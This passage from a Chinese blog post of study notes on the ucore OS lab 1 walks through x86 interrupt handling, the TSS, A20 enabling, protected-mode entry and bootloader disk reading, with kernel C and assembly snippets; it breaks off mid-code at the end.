/><ul><li>门中的DPL和段选择符一起控制着访问，同时，段选择符结合偏移量（Offset）指出了中断处理例程的入口点。内核一般在门描述符中填入内核代码段的段选择子。产生中断前后，CPU一定不会将运行控制从高特权环转向低特权环，特权级必须要么保持不变（当操作系统内核自己被中断的时候），或被提升（当用户态程序被中断的时候）。无论哪一种情况，CPL必须大于等于目的代码段的DPL。如果CPL发生了改变，一个堆栈切换操作（通过<strong>TSS</strong>完成）就会发生。如果中断是被用户态程序中的指令所触发的（比如软件执行INT n生产的中断），还会增加一个额外的检查：门的DPL必须具有与CPL相同或更低的特权。这就防止了用户代码随意触发中断。如果这些检查失败，会产生一个一般保护异常（general-protection exception）。</li></ul></li></ul><h4 id="ucore的实现流程"><a href="#ucore的实现流程" class="headerlink" title="ucore的实现流程"></a>ucore的实现流程</h4><ol><li>首先中断有几种类型<ul><li>使用int软中断, 中断号为<code>T_SWITCH_TOU</code>. 由于一开始ucore运行在内核, 所以内核到用户时会弹出栈上的ss和esp, 所以要在int指令前面加上两个push, 还要注意指令的字节长度匹配.</li><li>使用int软中断, 中断号为<code>T_SWITCH_TOK</code>. 这个时候从用户态到内核态, 要通过TR寄存器查找当前的内核栈地址, 立即切换然后压入用户态的ss和esp, 由于challenge里有说明不用返回, 所以int执行完后要释放这两个东西.</li><li>其他情况就是时钟中断和键盘中断到目前为止都是内核-&gt;内核再跳回内核, 没有什么复杂之处.</li></ul></li><li>cpu接收到中断号, 然后到IDT表里把中断号当做下标查找Interrupt Discriptor, 这个时候就找到了中断处理例程的入口地址.</li><li>cpu依次压入eflags，cs，eip, errorCode(如果是有错误码的异常), 然后加载描述符中的地址, 进入中断处理例程.</li><li>处理例程一开始就是两个pushl, 分别是errorCode和trapno), 再jmp到<code>__alltraps</code>把可能需要改变的寄存器值压到栈上<br>在栈上倒着构建一个trapframe</li><li>接下来进入处理例程, 0-31中断号由Intel保留, ucore定义的用<code>IRQ_OFFSET + IRQ_xx</code><ul><li>如果是时钟中断, inc一个全局变量tick, 没啥复杂的</li><li>如果是特权级转换, 更改一下trapframe的cs, es, ds, fs即可</li></ul></li><li>执行完毕后弹出由我们压入的寄存器值, 然后到了<code>__altraps</code>的<code>iret</code>指令,  由cpu弹出eip, cs, eflags</li><li>判断特权级转换来决定是否弹出ss, esp, <strong>中断结束</strong> </li></ol><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* registers as pushed by pushal */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pushregs</span> &#123;</span><br>    <span class="hljs-keyword">uint32_t</span> reg_edi;<br>    <span class="hljs-keyword">uint32_t</span> reg_esi;<br>    <span class="hljs-keyword">uint32_t</span> reg_ebp;<br>    <span class="hljs-keyword">uint32_t</span> reg_oesp;          <span class="hljs-comment">/* Useless */</span><br>    <span class="hljs-keyword">uint32_t</span> reg_ebx;<br>    <span class="hljs-keyword">uint32_t</span> reg_edx;<br>    <span class="hljs-keyword">uint32_t</span> reg_ecx;<br>    <span class="hljs-keyword">uint32_t</span> reg_eax;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">trapframe</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pushregs</span> <span class="hljs-title">tf_regs</span>;</span><br>    <span class="hljs-keyword">uint16_t</span> tf_gs;<br>    <span class="hljs-keyword">uint16_t</span> tf_padding0;<br>    <span class="hljs-keyword">uint16_t</span> tf_fs;<br>    <span class="hljs-keyword">uint16_t</span> tf_padding1;<br>    <span class="hljs-keyword">uint16_t</span> tf_es;<br>    <span class="hljs-keyword">uint16_t</span> tf_padding2;<br>    <span class="hljs-keyword">uint16_t</span> tf_ds;<br>    <span class="hljs-keyword">uint16_t</span> tf_padding3;<br>    <span class="hljs-keyword">uint32_t</span> tf_trapno;<br>    <span class="hljs-comment">/* below here defined by x86 hardware */</span><br>    <span class="hljs-keyword">uint32_t</span> tf_err;<br>    <span class="hljs-keyword">uintptr_t</span> tf_eip;<br>    <span class="hljs-keyword">uint16_t</span> tf_cs;<br>    <span class="hljs-keyword">uint16_t</span> tf_padding4;<br>    <span class="hljs-keyword">uint32_t</span> tf_eflags;<br>    <span class="hljs-comment">/* below here only when crossing rings, such as from user to kernel */</span><br>    <span class="hljs-keyword">uintptr_t</span> tf_esp;<br>    <span class="hljs-keyword">uint16_t</span> tf_ss;<br>    <span class="hljs-keyword">uint16_t</span> tf_padding5;<br>&#125; __attribute__((packed));<br></code></pre></div></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">#----------------------------vector.S<br>.globl vector120<br>vector120:<br>  pushl $0<br>  pushl $120<br>  jmp __alltraps<br>#----------------------------trapentry.S<br>#include &lt;memlayout.h&gt;<br><br># vectors.S sends all traps here.<br>.text<br>.globl __alltraps<br>__alltraps:<br>    # push registers to build a trap frame<br>    # therefore make the stack look like a struct trapframe<br>    pushl %ds<br>    pushl %es<br>    pushl %fs<br>    pushl %gs<br>    pushal<br><br>    # load GD_KDATA into %ds and %es to set up data segments for kernel<br>    movl $GD_KDATA, %eax<br>    movw %ax, %ds<br>    movw %ax, %es<br><br>    # push %esp to pass a pointer to the trapframe as an argument to trap()<br>    pushl %esp<br><br>    # call trap(tf), where tf=%esp<br>    call trap<br><br>    # pop the pushed stack pointer<br>    popl %esp<br><br>    # return falls through to trapret...<br>.globl __trapret<br>__trapret:<br>    # restore registers from stack<br>    popal<br><br>    # restore %ds, %es, %fs and %gs<br>    popl %gs<br>    popl %fs<br>    popl %es<br>    popl %ds<br><br>    # get rid of the trap number and error code<br>    addl $0x8, %esp<br>    iret<br></code></pre></div></td></tr></table></figure><h3 id="5-地址空间"><a href="#5-地址空间" class="headerlink" title="5.地址空间"></a>5.地址空间</h3><pre><code class=" mermaid">flowchart LR    逻辑地址或虚拟地址--&gt;|分段地址转换|线性地址    线性地址--&gt;|分页地址转换|物理地址    线性地址--&gt;End</code></pre><h3 id="6-硬件访问"><a href="#6-硬件访问" class="headerlink" title="6.硬件访问"></a>6.<a href="https://chyyuu.gitbooks.io/ucore_os_docs/content/lab1/lab1_3_2_3_dist_accessing.html">硬件访问</a></h3><p>bootloader让CPU进入保护模式后，下一步的工作就是从硬盘上加载并运行OS。考虑到实现的简单性，bootloader的访问硬盘都是LBA模式的PIO（Program IO）方式，即所有的IO操作是通过CPU访问硬盘的IO地址寄存器完成。</p><p>一般主板有2个IDE通道，每个通道可以接2个IDE硬盘。访问第一个硬盘的扇区可设置IO地址寄存器0x1f0-0x1f7实现的，具体参数见下表。一般第一个IDE通道通过访问IO地址0x1f0-0x1f7来实现，第二个IDE通道通过访问0x170-0x17f实现。每个通道的主从盘的选择通过第6个IO偏移地址寄存器来设置。</p><p>表一 磁盘IO地址和对应功能</p><p>第6位：为1=LBA模式；0 = CHS模式 第7位和第5位必须为1</p><table><thead><tr><th>IO地址</th><th>功能</th></tr></thead><tbody><tr><td>0x1f0</td><td>读数据，当0x1f7不为忙状态时，可以读。</td></tr><tr><td>0x1f2</td><td>要读写的扇区数，每次读写前，你需要表明你要读写几个扇区。最小是1个扇区</td></tr><tr><td>0x1f3</td><td>如果是LBA模式，就是LBA参数的0-7位</td></tr><tr><td>0x1f4</td><td>如果是LBA模式，就是LBA参数的8-15位</td></tr><tr><td>0x1f5</td><td>如果是LBA模式，就是LBA参数的16-23位</td></tr><tr><td>0x1f6</td><td>第0~3位：如果是LBA模式就是24-27位 第4位：为0主盘；为1从盘</td></tr><tr><td>0x1f7</td><td>状态和命令寄存器。操作时先给命令，再读取，如果不是忙状态就从0x1f0端口读数据</td></tr></tbody></table><p>当前 硬盘数据是储存到硬盘扇区中，一个扇区大小为512字节。读一个扇区的流程（可参看boot/bootmain.c中的readsect函数实现）大致如下：</p><ol><li>等待磁盘准备好</li><li>发出读取扇区的命令</li><li>等待磁盘准备好</li><li>把磁盘扇区数据读到指定内存</li></ol><h3 id="附-TSS"><a href="#附-TSS" class="headerlink" title="附: TSS"></a>附: TSS</h3><p>在<code>kern_init()-&gt;pmm_init()-&gt;gdt_init()</code>中初始化, TSS中的内核栈地址就在这里设置</p><p>TSS可以在内存的任意位置, 而ucore的taskstate定义在pmm.c中, 通过构造<em>门描述符</em> , 弄到<code>struct segdesc gdt[]</code>里面,<br>然后使用lgdt指令加载到GDT中, <strong>内核栈(8KB)从<code>c0120000 bootstack</code>到<code>c0122000 bootstacktop</code></strong>, 在entry.S中找到的, kernel.sym可看地址</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">...详见Lab2<br><span class="hljs-comment">// Since we are using bootloader&#x27;s GDT,</span><br>  <span class="hljs-comment">// we should reload gdt (second time, the last time) to get user segments and the TSS</span><br>  <span class="hljs-comment">// map virtual_addr 0 ~ 4G = linear_addr 0 ~ 4G</span><br>  <span class="hljs-comment">// then set kernel stack (ss:esp) in TSS, setup TSS in gdt, load TSS</span><br>  gdt_init();<br>  ...<br></code></pre></div></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SEG_TSS     5</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> GD_TSS      ((SEG_TSS) &lt;&lt; 3)        <span class="hljs-comment">// task segment selector</span></span><br><span class="hljs-comment">/* gdt_init - initialize the default GDT and TSS */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">gdt_init</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// set boot kernel stack and default SS0</span><br>    load_esp0((<span class="hljs-keyword">uintptr_t</span>)bootstacktop);<br>    ts.ts_ss0 = KERNEL_DS;<br><br>    <span class="hljs-comment">// initialize the TSS filed of the gdt</span><br>    gdt[SEG_TSS] = SEGTSS(STS_T32A, (<span class="hljs-keyword">uintptr_t</span>)&amp;ts, <span class="hljs-keyword">sizeof</span>(ts), DPL_KERNEL);<br><br>    <span class="hljs-comment">// reload all segment registers</span><br>    lgdt(&amp;gdt_pd);<br><br>    <span class="hljs-comment">// load the TSS</span><br>    ltr(GD_TSS);<br>&#125;<br></code></pre></div></td></tr></table></figure><img src="../../image/ucore/image-20211221160818556.png" alt="image-20211221160818556" style="zoom: 67%;" /><img src="../../image/ucore/image-20211221161024855.png" alt="image-20211221161024855" style="zoom:67%;" /><h2 id="几个练习"><a href="#几个练习" class="headerlink" title="几个练习"></a>几个练习</h2><h3 id="项目组成"><a href="#项目组成" class="headerlink" title="项目组成"></a><a href="https://chyyuu.gitbooks.io/ucore_os_docs/content/lab1/lab1_2_2_files.html">项目组成</a></h3><h3 id="练习一"><a href="#练习一" class="headerlink" title="练习一"></a>练习一</h3><blockquote><p>理解通过<a href="https://www.gnu.org/software/make/manual/make.html">make</a>生成执行文件的过程</p></blockquote><ul><li><p>操作系统镜像文件ucore.img是如何一步一步生成的？(需要比较详细地解释Makefile中每一条相关命令和命令参数的含义，以及说明命令导致的结果)</p><ul><li>Makefile掌握不够的话根本看不懂在写什么</li></ul></li><li><p>一个被系统认为是符合规范的硬盘主引导扇区的特征是什么？</p><ul><li>最后两个字节是0x55,0xAA</li></ul></li><li><p><strong>离大谱, 这就是清华dalao吗 <a href="https://www.jianshu.com/p/2f95d38afa1d">link</a></strong>  </p></li></ul><h3 id="练习二"><a href="#练习二" class="headerlink" title="练习二"></a>练习二</h3><blockquote><p>使用qemu执行并调试lab1中的软件</p></blockquote><ol><li><p>从CPU加电后执行的第一条指令开始，单步跟踪BIOS的执行。</p><ul><li>直接将gdb连接到qemu, 断点也不用下直接停在第一条指令上</li><li>要注意的是此时<code>$pc($eip)</code>不是真实的地址, <code>(($cs&lt;&lt;4)+$eip)</code>才是</li></ul></li><li><p>在初始化位置0x7c00设置实地址断点,测试断点正常。</p><ul><li>此时在bootloader中, 设置为<code>file obj/bootblock.o</code>和<code>b *0x7c00</code>即可(别忘了<code>continue</code>要不然就是第一个问题了)</li></ul></li><li><p>从0x7c00开始跟踪代码运行,将单步跟踪反汇编得到的代码与bootasm.S和 bootblock.asm进行比较。</p><figure class="highlight makefile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs makefile"><span class="hljs-comment">#改写Makefile文件</span><br><span class="hljs-section">debug: <span class="hljs-variable">$(UCOREIMG)</span></span><br>    <span class="hljs-variable">$(V)</span><span class="hljs-variable">$(TERMINAL)</span> -e <span class="hljs-string">&quot;<span class="hljs-variable">$(QEMU)</span> -S -s -d in_asm -D <span class="hljs-variable">$(BINDIR)</span>/q.log -parallel stdio -hda <span class="hljs-variable">$&lt;</span> -serial null&quot;</span><br>    <span class="hljs-variable">$(V)</span>sleep 2<br>    <span class="hljs-variable">$(V)</span><span class="hljs-variable">$(TERMINAL)</span> -e <span class="hljs-string">&quot;gdb -q -tui -x tools/gdbinit&quot;</span><br></code></pre></div></td></tr></table></figure><p>在调用qemu时增加<code>-d in_asm -D q.log</code>参数，便可以将运行的汇编指令保存在q.log中。</p></li></ol><h3 id="练习三"><a href="#练习三" class="headerlink" title="练习三"></a>练习三</h3><blockquote><p>分析bootloader进入保护模式的过程.</p></blockquote><ul><li><p>为何开启A20，以及如何开启A20</p><ul><li><p>Intel早期的8086 CPU提供了20根地址线，但寄存器只有16位，所以使用<strong>段寄存器值 &lt;&lt; 4 + 段内偏移值</strong>的方法来访问到所有内存，但按这种方式来计算出的地址的最大值为1088KB，超过20根地址线所能表示的范围，会发生“回卷”（和整数溢出有点类似）。但下一代的基于Intel 80286 CPU的计算机系统提供了24根地址线，当CPU计算出的地址超过1MB时便<strong>不会发生回卷</strong>，而这就造成了<strong>向下不兼容</strong>。为了保持完全的向下兼容性，IBM在计算机系统上加个硬件逻辑来模仿早期的回绕特征，而这就是<strong>A20 Gate</strong>。</p></li><li><p>A20 Gate的方法是把A20地址线控制和键盘控制器的一个输出进行AND操作，这样来控制A20地址线的打开（使能）和关闭（屏蔽\禁止）。一开始时A20地址线控制是被屏蔽的（总为0），直到系统软件通过一定的IO操作去打开它。当A20 地址线控制禁止时，则程序就像在8086中运行，1MB以上的地址不可访问；保护模式下A20地址线控制必须打开。A20控制打开后，内存寻址将不会发生回卷。</p></li><li><p>在当前环境中，所用到的键盘控制器8042的IO端口只有0x60和0x64两个端口。8042通过这些端口给键盘控制器或键盘发送命令或读取状态。输出端口P2用于特定目的。位0（P20引脚）用于实现CPU复位操作，位1（P21引脚）用于控制A20信号线的开启与否。</p></li><li><p>有关概念:</p><p>8042有4个寄存器：</p><ul><li>1个8-bit长的Input buffer；Write-Only；</li><li>1个8-bit长的Output buffer； Read-Only；</li><li>1个8-bit长的Status Register；Read-Only；</li><li>1个8-bit长的Control Register；Read/Write。</li></ul><p>有两个端口地址：60h和64h，有关对它们的读写操作描述如下：</p><ul><li>读60h端口，读output buffer</li><li>写60h端口，写input buffer</li><li>读64h端口，读Status Register</li><li>操作Control Register，首先要向64h端口写一个命令（20h为读命令，60h为写命令），然后根据命令从60h端口读出Control Register的数据或者向60h端口写入Control Register的数据（64h端口还可以接受许多其它的命令）。<br>如果要<strong>写output</strong>, 则向64h写入命令0d1h, 向input buf写入control register中命令的参数</li></ul><p>Status Register的定义（要用bit 0和bit 1）：</p><table><thead><tr><th>bit</th><th>meaning</th></tr></thead><tbody><tr><td>0</td><td>output register (60h) 中有数据</td></tr><tr><td><strong>1</strong></td><td><strong>input register (60h/64h) 有数据</strong></td></tr><tr><td>2</td><td>系统标志（上电复位后被置为0）</td></tr><tr><td>3</td><td>data in input register is command (1) or data (0)</td></tr><tr><td>4-7</td><td>(Nothing special)</td></tr></tbody></table></li></ul></li></ul><p><img src="https://i.loli.net/2021/11/15/o2X7OPRbzxvVeUS.png" alt="img"></p><ul><li><p>代码中的流程:</p><p><strong>读0x64端口(读Status Register), 等待第二位(标志input buffer是否为空)等于0<br>向64h发送0d1h命令(作用是写output port,即一个键盘控制器命令),<br>然后等待input buf为空时向0x60h写入control register的参数(即要输出在output port上的值)</strong></p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">    # Enable A20:<br>    #  For backwards compatibility with the earliest PCs, physical<br>    #  address line 20 is tied low, so that addresses higher than<br>    #  1MB wrap around to zero by default. This code undoes this.<br>seta20.1:<br>    inb $0x64, %al                                  # Wait for not busy(8042 input buffer empty).<br>    testb $0x2, %al<br>    jnz seta20.1<br><br>    movb $0xd1, %al                                 # 0xd1 -&gt; port 0x64<br>    outb %al, $0x64                                 # 0xd1 means: write data to 8042&#x27;s P2 port<br><br>seta20.2:<br>    inb $0x64, %al                                  # Wait for not busy(8042 input buffer empty).<br>    testb $0x2, %al<br>    jnz seta20.2<br><br>    movb $0xdf, %al                                 # 0xdf -&gt; port 0x60<br>    outb %al, $0x60                                 # 0xdf = 11011111, means set P2&#x27;s A20 bit(the 1 bit) to 1<br></code></pre></div></td></tr></table></figure><ul><li>如何初始化GDT表</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">lgdt gdtdesc<br># Bootstrap GDT<br>.p2align 2                                          # force 4 byte alignment<br>gdt:<br>    SEG_NULLASM                                     # null seg<br>    SEG_ASM(STA_X|STA_R, 0x0, 0xffffffff)           # code seg for bootloader and kernel<br>    SEG_ASM(STA_W, 0x0, 0xffffffff)                 # data seg for bootloader and kernel<br><br>gdtdesc:<br>    .word 0x17                                      # sizeof(gdt) - 1<br>    .long gdt                                       # address gdt<br>    <br># asm.h<br>#define STA_X       0x8     // Executable segment<br>#define STA_W       0x2     // Writeable (non-executable segments)<br>#define STA_R       0x2     // Readable (executable segments)<br></code></pre></div></td></tr></table></figure><ul><li>进入保护模式：通过将cr0寄存器PE位置1便开启了保护模式</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">movl %cr0, %eax<br>orl $CR0_PE_ON, %eax<br>movl %eax, %cr0<br></code></pre></div></td></tr></table></figure><ul><li>通过长跳转更新cs的基地址</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">ljmp $PROT_MODE_CSEG, $protcseg<br>.code32<br>protcseg:<br></code></pre></div></td></tr></table></figure><ul><li>设置段寄存器，并建立堆栈</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">movw $PROT_MODE_DSEG, %ax<br>movw %ax, %ds<br>movw %ax, %es<br>movw %ax, %fs<br>movw %ax, %gs<br>movw %ax, %ss<br>movl $0x0, %ebp<br>movl $start, %esp<br></code></pre></div></td></tr></table></figure><ul><li>转到保护模式完成，进入boot主方法</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">call bootmain<br></code></pre></div></td></tr></table></figure><h3 id="练习四"><a href="#练习四" class="headerlink" title="练习四"></a>练习四</h3><blockquote><p>分析bootloader加载ELF格式的OS的过程。</p></blockquote><ul><li>IDE: Integrated Drive Electronics，它的本意是指把控制器与盘体集成在一起的硬盘驱动器，IDE是表示硬盘的传输接口。</li></ul><p>bootloader让CPU进入保护模式后，下一步的工作就是从硬盘上加载并运行OS。考虑到实现的简单性，bootloader的访问硬盘都是LBA模式的PIO（Program IO）方式，即所有的IO操作是通过CPU访问硬盘的IO地址寄存器完成。</p><p>一般主板有2个IDE通道，每个通道可以接2个IDE硬盘。访问第一个硬盘的扇区可设置IO地址寄存器0x1f0-0x1f7实现的，具体参数见下表。一般第一个IDE通道通过访问IO地址0x1f0-0x1f7来实现，第二个IDE通道通过访问0x170-0x17f实现。每个通道的主从盘的选择通过第6个IO偏移地址寄存器来设置。</p><table><thead><tr><th>IO地址</th><th>功能</th></tr></thead><tbody><tr><td>0x1f0</td><td>读数据，当0x1f7不为忙状态时，可以读。</td></tr><tr><td>0x1f2</td><td>要读写的扇区数，每次读写前，你需要表明你要读写几个扇区。最小是1个扇区</td></tr><tr><td>0x1f3</td><td>如果是LBA模式，就是LBA参数的0-7位</td></tr><tr><td>0x1f4</td><td>如果是LBA模式，就是LBA参数的8-15位</td></tr><tr><td>0x1f5</td><td>如果是LBA模式，就是LBA参数的16-23位</td></tr><tr><td>0x1f6</td><td>第0~3位：如果是LBA模式就是24-27位 第4位：为0主盘；为1从盘</td></tr><tr><td>0x1f7</td><td>状态和命令寄存器。操作时先给命令，再读取，如果不是忙状态就从0x1f0端口读数据</td></tr></tbody></table><p>当前 硬盘数据是储存到硬盘扇区中，一个扇区大小为512字节。读一个扇区的流程（可参看boot/bootmain.c中的readsect函数实现）大致如下：</p><ol><li>等待磁盘准备好</li><li>发出读取扇区的命令</li><li>等待磁盘准备好</li><li>把磁盘扇区数据读到指定内存</li></ol><p><strong>分析bootloader加载ELF格式的OS的过程。</strong> </p><p>首先看readsect函数，<br><code>readsect</code>从设备的第secno扇区读取数据到dst位置</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">readsect</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *dst, <span class="hljs-keyword">uint32_t</span> secno)</span> </span>&#123;<br>    waitdisk();<br><br>    outb(<span class="hljs-number">0x1F2</span>, <span class="hljs-number">1</span>);                         <span class="hljs-comment">// 设置读取扇区的数目为1</span><br>    outb(<span class="hljs-number">0x1F3</span>, secno &amp; <span class="hljs-number">0xFF</span>);<br>    outb(<span class="hljs-number">0x1F4</span>, (secno &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>);<br>    outb(<span class="hljs-number">0x1F5</span>, (secno &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>);<br>    outb(<span class="hljs-number">0x1F6</span>, ((secno &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0xF</span>) | <span class="hljs-number">0xE0</span>);<br>        <span class="hljs-comment">// 上面四条指令联合制定了扇区号</span><br>        <span class="hljs-comment">// 在这4个字节线联合构成的32位参数中</span><br>        <span class="hljs-comment">//   29-31位强制设为1</span><br>        <span class="hljs-comment">//   28位(=0)表示访问&quot;Disk 0&quot;</span><br>        <span class="hljs-comment">//   0-27位是28位的偏移量</span><br>    outb(<span class="hljs-number">0x1F7</span>, <span class="hljs-number">0x20</span>);                      <span class="hljs-comment">// 0x20命令，读取扇区</span><br><br>    waitdisk();<br><br>    insl(<span class="hljs-number">0x1F0</span>, dst, SECTSIZE / <span class="hljs-number">4</span>);         <span class="hljs-comment">// 读取到dst位置，</span><br>                                            <span class="hljs-comment">// 幻数4因为这里以DW为单位</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>readseg简单包装了readsect，可以从设备读取任意长度的内容。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">readseg</span><span class="hljs-params">(<span class="hljs-keyword">uintptr_t</span> va, <span class="hljs-keyword">uint32_t</span> count, <span class="hljs-keyword">uint32_t</span> offset)</span> </span>&#123;<br>    <span class="hljs-keyword">uintptr_t</span> end_va = va + count;<br><br>    va -= offset % SECTSIZE;<br><br>    <span class="hljs-keyword">uint32_t</span> secno = (offset / SECTSIZE) + <span class="hljs-number">1</span>; <br>    <span class="hljs-comment">// 加1因为0扇区被引导占用</span><br>    <span class="hljs-comment">// ELF文件从1扇区开始</span><br><br>    <span class="hljs-keyword">for</span> (; va &lt; end_va; va += SECTSIZE, secno ++) &#123;<br>        readsect((<span class="hljs-keyword">void</span> *)va, secno);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>在bootmain函数中，</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 